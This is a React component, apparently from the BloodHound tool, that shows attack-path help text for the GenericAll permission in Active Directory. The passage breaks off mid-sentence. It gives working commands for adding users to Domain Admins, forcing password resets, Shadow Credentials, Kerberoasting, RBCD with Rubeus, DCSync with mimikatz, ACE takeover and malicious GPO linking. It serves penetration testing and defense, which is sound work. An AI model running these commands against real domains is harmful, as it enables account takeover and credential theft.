// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link } from '@mui/material';
import { Typography } from 'doodle-ui';
import { FC } from 'react';
import { AdcsEsc14ScenarioAWindows, AltSecIdentitiesBlurb } from '../AdcsEsc14ScenarioA';
import CodeController from '../CodeController/CodeController';
import { EdgeInfoProps } from '../index';

const WindowsAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
    sourceName,
    sourceType,
    targetName,
    targetType,
    targetId,
    haslaps,
}) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a group allows you to directly modify group membership of the group.
                    </Typography>

                    <Typography variant='body2'>
                        There are at least two ways to execute this attack. The first and most obvious is by using the
                        built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See
                        the opsec considerations tab for why this may be a bad idea. The second, and highly recommended
                        method, is by using the Add-DomainGroupMember function in PowerView. This function is superior
                        to using the net.exe binary in several ways. For instance, you can supply alternate credentials,
                        instead of needing to run a process as or logon as the user with the AddMember permission.
                        Additionally, you have much safer execution options than you do with spawning net.exe (see the
                        opsec tab).
                    </Typography>

                    <Typography variant='body2'>
                        To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into
                        your agent session or into a PowerShell instance at the console. You may need to authenticate to
                        the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object
                        (these examples comes from the PowerView help documentation):
                    </Typography>

                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>

                    <Typography variant='body2'>
                        Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a
                        process as {sourceName}:
                    </Typography>

                    <Typography component={'pre'}>
                        {"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}
                    </Typography>

                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group with PowerView's
                        Get-DomainGroupMember:
                    </Typography>

                    <Typography component={'pre'}>{"Get-DomainGroupMember -Identity 'Domain Admins'"}</Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        The GenericAll permission grants {sourceName} the ability to change the password of the user{' '}
                        {targetName} without knowing their current password. This is equivalent to the
                        "ForceChangePassword" edge in BloodHound.
                    </Typography>
                    <Typography variant='body2'>
                        GenericAll also grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
                        attribute of {targetName}. Writing to this property allows an attacker to create "Shadow
                        Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is
                        equivalent to the "AddKeyCredentialLink" edge.
                    </Typography>

                    <AltSecIdentitiesBlurb />

                    <Typography variant='body2'>
                        Alternatively, GenericAll enables {sourceName} to set a ServicePrincipalName (SPN) on the
                        targeted user, which may be abused in a Targeted Kerberoast attack.
                    </Typography>

                    <Typography variant='body1'> Force Change Password attack </Typography>

                    <Typography variant='body2'>
                        There are at least two ways to execute this attack. The first and most obvious is by using the
                        built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec
                        considerations tab for why this may be a bad idea. The second, and highly recommended method, is
                        by using the Set-DomainUserPassword function in PowerView. This function is superior to using
                        the net.exe binary in several ways. For instance, you can supply alternate credentials, instead
                        of needing to run a process as or logon as the user with the ForceChangePassword permission.
                        Additionally, you have much safer execution options than you do with spawning net.exe (see the
                        opsec tab).
                    </Typography>

                    <Typography variant='body2'>
                        To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into
                        your agent session or into a PowerShell instance at the console. You may need to authenticate to
                        the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object
                        (these examples comes from the PowerView help documentation):
                    </Typography>

                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>

                    <Typography variant='body2'>
                        Then create a secure string object for the password you want to set on the target user:
                    </Typography>

                    <Typography component={'pre'}>
                        {"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}
                    </Typography>

                    <Typography variant='body2'>
                        Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running
                        a process as {sourceName}:
                    </Typography>

                    <Typography component={'pre'}>
                        {'Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred'}
                    </Typography>

                    <Typography variant='body2'>
                        Now that you know the target user's plain text password, you can either start a new agent as
                        that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions,
                        or perhaps even RDP to a system the target user has access to. For more ideas and information,
                        see the references tab.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>

                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User' || sourceType === 'Computer'
                            ? `${sourceName} if you are not running a process as that user/computer`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                    </Typography>

                    <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the Whisker documentation.
                    </Typography>

                    <AdcsEsc14ScenarioAWindows />

                    <Typography variant='body1'> Targeted Kerberoast attack </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with
                        Get-DomainSPNTicket.
                    </Typography>
                    <Typography variant='body2'>
                        You may need to authenticate to the Domain Controller as{' '}
                        {sourceType === 'User'
                            ? `${sourceName} if you are not running a process as that user`
                            : `a member of ${sourceName} if you are not running a process as a member`}
                        . To do this in conjunction with Set-DomainObject, first create a PSCredential object (these
                        examples comes from the PowerView help documentation):
                    </Typography>
                    <Typography component={'pre'}>
                        {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                            "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                    </Typography>
                    <Typography variant='body2'>
                        Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process
                        as {sourceName}:
                    </Typography>
                    <Typography component={'pre'}>
                        {
                            "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
                        }
                    </Typography>
                    <Typography variant='body2'>
                        After running this, you can use Get-DomainSPNTicket as follows:
                    </Typography>
                    <Typography component={'pre'}>{'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'}</Typography>
                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice. Cleanup of the
                        ServicePrincipalName can be done with the Set-DomainObject command:
                    </Typography>
                    <Typography component={'pre'}>
                        {'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'}
                    </Typography>
                </>
            );
        case 'Computer':
            if (haslaps) {
                return (
                    <>
                        <Typography variant='body2'>
                            The GenericAll permission grants {sourceName} the ability to obtain the LAPS (RID 500
                            administrator) password of {targetName}.
                        </Typography>

                        <Typography variant='body2'>
                            GenericAll also grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
                            attribute of {targetName}. Writing to this property allows an attacker to create "Shadow
                            Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is
                            equivalent to the "AddKeyCredentialLink" edge.
                        </Typography>

                        <Typography variant='body2'>
                            Alternatively, GenericAll on a computer object can be used to perform a Resource-Based
                            Constrained Delegation attack.
                        </Typography>

                        <AltSecIdentitiesBlurb />

                        <Typography variant='body1'> Retrieve LAPS Password </Typography>
                        <Typography variant='body2'>
                            For systems using legacy LAPS, the following AD computer object properties are relevant:
                            <br />
                            <b>- ms-Mcs-AdmPwd</b>: The plaintext LAPS password
                            <br />
                            <b>- ms-Mcs-AdmPwdExpirationTime</b>: The LAPS password expiration time
                            <br />
                        </Typography>
                        <Typography variant='body2'>
                            For systems using Windows LAPS (2023 edition), the following AD computer object properties
                            are relevant:
                            <br />
                            <b>- msLAPS-Password</b>: The plaintext LAPS password
                            <br />
                            <b>- msLAPS-PasswordExpirationTime</b>: The LAPS password expiration time
                            <br />
                            <b>- msLAPS-EncryptedPassword</b>: The encrypted LAPS password
                            <br />
                            <b>- msLAPS-EncryptedPasswordHistory</b>: The encrypted LAPS password history
                            <br />
                            <b>- msLAPS-EncryptedDSRMPassword</b>: The encrypted Directory Services Restore Mode (DSRM)
                            password
                            <br />
                            <b>- msLAPS-EncryptedDSRMPasswordHistory</b>: The encrypted DSRM password history
                            <br />
                        </Typography>
                        <Typography variant='body2'>
                            Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'
                            }
                        </Typography>
                        <Typography variant='body2'>
                            Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:
                        </Typography>
                        <Typography component={'pre'}>{'Get-LapsADPassword "WIN10" -AsPlainText'}</Typography>
                        <Typography variant='body2'>
                            The encrypted attributes can also be retrieved and decrypted using{' '}
                            <Link
                                target='_blank'
                                rel='noopener noreferrer'
                                href='https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt'>
                                lapsv2decrypt
                            </Link>{' '}
                            (dotnet or BOF).
                        </Typography>

                        <Typography variant='body1'> Shadow Credentials attack </Typography>

                        <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>

                        <Typography variant='body2'>
                            You may need to authenticate to the Domain Controller as{' '}
                            {sourceType === 'User' || sourceType === 'Computer'
                                ? `${sourceName} if you are not running a process as that user/computer`
                                : `a member of ${sourceName} if you are not running a process as a member`}
                        </Typography>

                        <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>

                        <Typography variant='body2'>
                            For other optional parameters, view the Whisker documentation.
                        </Typography>

                        <Typography variant='body1'> Resource-Based Constrained Delegation attack </Typography>

                        <Typography variant='body2'>
                            Abusing this primitive is possible through the Rubeus project.
                        </Typography>

                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, Kevin Robertson's
                            Powermad project can be used to add a new attacker-controlled computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            PowerView can be used to then retrieve the security identifier (SID) of the newly created
                            computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
                            objectsid
                        </Typography>

                        <Typography variant='body2'>
                            We now need to build a generic ACE with the attacker-added computer SID as the principal,
                            and get the binary bytes for the new DACL/ACE:
                        </Typography>

                        <Typography component={'pre'}>
                            {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                                '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                                '$SD.GetBinaryForm($SDBytes, 0)'}
                        </Typography>

                        <Typography variant='body2'>
                            Next, we need to set this newly created security descriptor in the
                            msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over,
                            again using PowerView in this case:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                        </Typography>

                        <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>

                        <Typography variant='body2'>
                            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name
                            (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt),
                            and in this case grants us access to the file system of the TARGETCOMPUTER:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                            }
                        </Typography>

                        <AdcsEsc14ScenarioAWindows />
                    </>
                );
            } else {
                return (
                    <>
                        <Typography variant='body2'>
                            The GenericAll grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
                            attribute of {targetName}. Writing to this property allows an attacker to create "Shadow
                            Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is
                            equivalent to the "AddKeyCredentialLink" edge.
                        </Typography>

                        <Typography variant='body2'>
                            Alternatively, GenericAll on a computer object can be used to perform a Resource-Based
                            Constrained Delegation attack.
                        </Typography>

                        <AltSecIdentitiesBlurb />

                        <Typography variant='body1'> Shadow Credentials attack </Typography>

                        <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>

                        <Typography variant='body2'>
                            You may need to authenticate to the Domain Controller as{' '}
                            {sourceType === 'User' || sourceType === 'Computer'
                                ? `${sourceName} if you are not running a process as that user/computer`
                                : `a member of ${sourceName} if you are not running a process as a member`}
                        </Typography>

                        <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>

                        <Typography variant='body2'>
                            For other optional parameters, view the Whisker documentation.
                        </Typography>

                        <Typography variant='body1'> Resource-Based Constrained Delegation attack </Typography>

                        <Typography variant='body2'>
                            Abusing this primitive is possible through the Rubeus project.
                        </Typography>

                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, Kevin Robertson's
                            Powermad project can be used to add a new attacker-controlled computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            PowerView can be used to then retrieve the security identifier (SID) of the newly created
                            computer account:
                        </Typography>

                        <Typography component={'pre'}>
                            $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
                            objectsid
                        </Typography>

                        <Typography variant='body2'>
                            We now need to build a generic ACE with the attacker-added computer SID as the principal,
                            and get the binary bytes for the new DACL/ACE:
                        </Typography>

                        <Typography component={'pre'}>
                            {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                                '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                                '$SD.GetBinaryForm($SDBytes, 0)'}
                        </Typography>

                        <Typography variant='body2'>
                            Next, we need to set this newly created security descriptor in the
                            msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over,
                            again using PowerView in this case:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                            }
                        </Typography>

                        <Typography variant='body2'>
                            We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                        </Typography>

                        <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>

                        <Typography variant='body2'>
                            And finally we can use Rubeus' *s4u* module to get a service ticket for the service name
                            (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt),
                            and in this case grants us access to the file system of the TARGETCOMPUTER:
                        </Typography>

                        <Typography component={'pre'}>
                            {
                                'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
                            }
                        </Typography>

                        <AdcsEsc14ScenarioAWindows />
                    </>
                );
            }
        case 'Domain':
            return (
                <>
                    <Typography variant='body1'>DCSync attack</Typography>
                    <Typography variant='body2'>
                        Full control of a domain object grants you both DS-Replication-Get-Changes as well as
                        DS-Replication-Get-Changes-All rights. The combination of these rights allows you to perform the
                        dcsync attack using mimikatz. To grab the credential of the user harmj0y using these rights:
                    </Typography>

                    <Typography component={'pre'}>{'lsadump::dcsync /domain:testlab.local /user:harmj0y'}</Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to obtain control of the objects of the domain is to
                        apply a GenericAll ACE on the domain that will inherit down to all object types. This can be
                        done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us
                        more control over the ACE we add to the domain object.
                    </Typography>

                    <Typography variant='body2'>
                        Next, we will fetch the GUID for all objects. This should be
                        '00000000-0000-0000-0000-000000000000':
                    </Typography>

                    <Typography component={'pre'}>
                        {'$Guids = Get-DomainGUIDMap\n' +
                            "$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}
                    </Typography>

                    <Typography variant='body2'>
                        Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full
                        control of all descendant objects:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"
                        }
                    </Typography>

                    <Typography variant='body2'>Finally, we will apply this ACE to the domain:</Typography>

                    <Typography component={'pre'}>
                        {'$DomainDN = "DC=dumpster,DC=fire"\n' +
                            '$dsEntry = [ADSI]"LDAP://$DomainDN"\n' +
                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                            '$dsEntry.PsBase.CommitChanges()'}
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. You could, for example,
                        grant a user "ForceChangePassword" permission against all user objects, or grant a security
                        group the ability to read every GMSA password under a certain OU. Below is an example taken from
                        PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password
                        from all computer objects in the "Workstations" OU:
                    </Typography>

                    <Typography component={'pre'}>
                        {'$Guids = Get-DomainGUIDMap\n' +
                            "$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n" +
                            "$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n" +
                            '$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n' +
                            '$OU = Get-DomainOU -Raw Workstations\n' +
                            '$DsEntry = $OU.GetDirectoryEntry()\n' +
                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                            '$dsEntry.PsBase.CommitChanges()'}
                    </Typography>

                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>

                    <Typography variant='body2'>
                        The compromise vector described above relies on ACL inheritance and will not work for objects
                        with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute
                        adminCount=1). This observation applies to any user or computer with inheritance disabled,
                        including objects located in nested OUs.
                    </Typography>

                    <Typography variant='body2'>
                        In this situation, GenericAll on the domain object may still be exploitable through gPLink.
                        GenericAll allows you to modify the domain's gPLink attribute, which can be abused to link a
                        malicious Group Policy Object (GPO) to the domain. The linked GPO applies to the domain's users
                        and computers, including those in nested OUs, and can force those child objects to execute
                        arbitrary commands, for example through an immediate scheduled task.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not control an existing GPO and cannot create one, exploitation requires the ability
                        to create machine accounts and add DNS records that do not already exist in the domain. An
                        already compromised domain-joined machine can also be used. Executing this attack vector is not
                        trivial and requires setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a compromised domain-joined Windows machine, you can exploit this gPLink manipulation path
                        with Powermad, PowerView, and native Windows functionality. For requirements and implementation
                        details, see{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
                            this article
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you control an existing GPO or can create one, the attack is simpler: inject a malicious
                        configuration, such as an immediate scheduled task, into a controlled GPO, then link that GPO to
                        the target domain object through its gPLink attribute.
                    </Typography>

                    <Typography variant='body2'>
                        Consider how many users and computers the target domain contains; each affected object will
                        attempt to retrieve and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        GenericAll on a GPO allows you to modify that GPO and inject malicious configuration. For
                        example, you can add an immediate scheduled task that runs on the computers or users that
                        process the GPO, compromising those objects. Some settings, including scheduled tasks, support
                        item-level targeting, which can limit execution to specific objects. GPOs apply every 90 minutes
                        for standard objects (with a random offset of 0 to 30 minutes), and every 5 minutes for domain
                        controllers. See the References tab for more detail.
                    </Typography>

                    <Typography variant='body2'>
                        On a domain-joined Windows machine, you can edit GPOs with the native Group Policy Management
                        Console (GPMC). On a non-domain-joined Windows machine, use the{' '}
                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/CCob/DRSAT'>
                            DRSAT (Disconnected RSAT)
                        </Link>{' '}
                        tool.
                    </Typography>
                </>
            );
        case 'OU':
            return (
                <>
                    <Typography variant='body1'>Control of the Organization Unit</Typography>

                    <Typography variant='body2'>
                        With full control of the OU, you may add a new ACE on the OU that will inherit down to the
                        objects under that OU. Below are two options depending on how targeted you choose to be in this
                        step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. Again, this can be done using
                        PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control
                        over the ACE we add to the OU.
                    </Typography>

                    <Typography variant='body2'>
                        First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU{' '}
                        {targetName} is: {targetId}.
                    </Typography>

                    <Typography variant='body2'>
                        Next, we will fetch the GUID for all objects. This should be
                        '00000000-0000-0000-0000-000000000000':
                    </Typography>

                    <Typography component={'pre'}>
                        {'$Guids = Get-DomainGUIDMap\n' +
                            "$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}
                    </Typography>

                    <Typography variant='body2'>
                        Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full
                        control of all descendant objects:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"
                        }
                    </Typography>

                    <Typography variant='body2'>Finally, we will apply this ACE to our target OU:</Typography>

                    <Typography component={'pre'}>
                        {'$OU = Get-DomainOU -Raw (OU GUID)\n' +
                            '$DsEntry = $OU.GetDirectoryEntry()\n' +
                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                            '$dsEntry.PsBase.CommitChanges()'}
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. You could, for example,
                        grant a user "ForceChangePassword" permission against all user objects, or grant a security
                        group the ability to read every GMSA password under a certain OU. Below is an example taken from
                        PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password
                        from all computer objects in the "Workstations" OU:
                    </Typography>

                    <Typography component={'pre'}>
                        {'$Guids = Get-DomainGUIDMap\n' +
                            "$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n" +
                            "$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n" +
                            '$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n' +
                            '$OU = Get-DomainOU -Raw Workstations\n' +
                            '$DsEntry = $OU.GetDirectoryEntry()\n' +
                            "$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n" +
                            '$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n' +
                            '$dsEntry.PsBase.CommitChanges()'}
                    </Typography>

                    <Typography variant='body1'>Objects for which ACL inheritance is disabled</Typography>

                    <Typography variant='body2'>
                        The compromise vector described above relies on ACL inheritance and will not work for objects
                        with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute
                        adminCount=1). This observation applies to any user or computer with inheritance disabled,
                        including objects located in nested OUs.
                    </Typography>

                    <Typography variant='body2'>
                        In this situation, GenericAll on the OU may still be exploitable through gPLink. GenericAll
                        allows you to modify the OU's gPLink attribute, which can be abused to link a malicious Group
                        Policy Object (GPO) to the OU. The linked GPO applies to the OU's users and computers, including
                        those in nested OUs, and can force those child objects to execute arbitrary commands, for
                        example through an immediate scheduled task.
                    </Typography>

                    <Typography variant='body2'>
                        If you do not control an existing GPO and cannot create one, exploitation requires the ability
                        to create machine accounts and add DNS records that do not already exist in the domain. An
                        already compromised domain-joined machine can also be used. Executing this attack vector is not
                        trivial and requires setup.
                    </Typography>

                    <Typography variant='body2'>
                        From a compromised domain-joined Windows machine, you can exploit this gPLink manipulation path
                        with Powermad, PowerView, and native Windows functionality. For requirements and implementation
                        details, see{' '}
                        <Link
                            target='_blank'
                            rel='noopener noreferrer'
                            href='https://labs.withsecure.com/publications/ou-having-a-laugh'>
                            this article
                        </Link>
                        .
                    </Typography>

                    <Typography variant='body2'>
                        If you control an existing GPO or can create one, the attack is simpler: inject a malicious
                        configuration, such as an immediate scheduled task, into a controlled GPO, then link that GPO to
                        the target OU through its gPLink attribute.
                    </Typography>

                    <Typography variant='body2'>
                        Consider how many users and computers the target OU contains; each affected object will attempt
                        to retrieve and apply the malicious GPO.
                    </Typography>
                </>
            );
        case 'Container':
            return (
                <>
                    <Typography variant='body2'>
                        With full control of the container, you may add a new ACE on the container that will inherit
                        down to the objects under that container.
                    </Typography>
                    <Typography variant='body2'>This can be done with PowerShell:</Typography>
                    <CodeController>
                        {`$containerDN = "CN=USERS,DC=DUMPSTER,DC=FIRE"
                            $principalName = "principal"     # SAM account name of principal
                            
                            # Find the certificate template
                            $template = [ADSI]"LDAP://$containerDN"
                            
                            # Construct the ACE
                            $account = New-Object System.Security.Principal.NTAccount($principalName)
                            $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
                            $ace = New-Object DirectoryServices.ActiveDirectoryAccessRule(
                                $sid,
                                [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                                [System.Security.AccessControl.AccessControlType]::Allow,
                                [System.DirectoryServices.ActiveDirectorySecurityInheritance]::Descendents
                            )
                            # Add the new ACE to the ACL
                            $acl = $template.psbase.ObjectSecurity
                            $acl.AddAccessRule($ace)
                            $template.psbase.CommitChanges()`}
                    </CodeController>
                </>
            );
        case 'CertTemplate':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a certificate template, you may be able to perform an ESC4
                        attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4
                        edge from the principal to the forest domain node.
                    </Typography>
                </>
            );
        case 'EnterpriseCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over an enterprise CA, you can publish certificate templates to the
                        enterprise CA by adding the CN name of the template in the enterprise CA object's
                        certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'RootCA':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a root CA, you can make a rogue certificate trusted as a root CA
                        in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This
                        action may enable you to perform an ADCS domain escalation.
                    </Typography>
                </>
            );
        case 'NTAuthStore':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over a NTAuth store, you can make an enterprise CA certificate
                        trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA
                        object's cACertificate attribute. This action may enable you to perform an ADCS domain
                        escalation.
                    </Typography>
                </>
            );
        case 'IssuancePolicy':
            return (
                <>
                    <Typography variant='body2'>
                        With GenericAll permission over an issuance policy object, you create a OID group link to a
                        targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of
                        the issuance policy object. This action may enable you to gain membership of the group through
